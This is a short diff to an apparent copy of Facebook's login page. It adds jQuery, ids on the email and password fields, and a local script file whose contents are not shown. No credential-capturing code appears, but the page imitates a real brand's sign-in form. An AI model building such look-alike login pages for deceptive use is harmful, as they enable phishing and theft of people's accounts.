@@ -7,6 +7,7 @@
 <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.0/css/all.css" integrity="sha384-lZN37f5QGtY3VHgisS14W3ExzMWZxybE1SJSEsQp9S+oqd12jhcu+A56Ebc1zFSJ" crossorigin="anonymous">
 <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
 <link href="https://fonts.googleapis.com/css?family=Roboto" rel="stylesheet">
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
 <title>Facebook - Log In or Sign Up</title>
 </head>
 
@@ -21,8 +22,8 @@
             <td class="logintext">Email or Phone</td>
             <td class="logintext"><span class="loginrowgap">Password</span></td>
           </tr>
-            <td><input class="logintext loginfield" type="text"></td>
-            <td><input class="logintext loginrowgap loginfield" type="password"></td>
+            <td><input id="username" class="logintext loginfield" type="text"></td>
+            <td><input id="password" class="logintext loginrowgap loginfield" type="password"></td>
             <td><input class="loginrowgap" id="loginbutton" type="submit" value="Log In"></td>
           </tr>
           <tr>
@@ -232,4 +233,5 @@
     </div>
     </div>
 </div>
+<script src="./js/index.js"></script>
 </body>
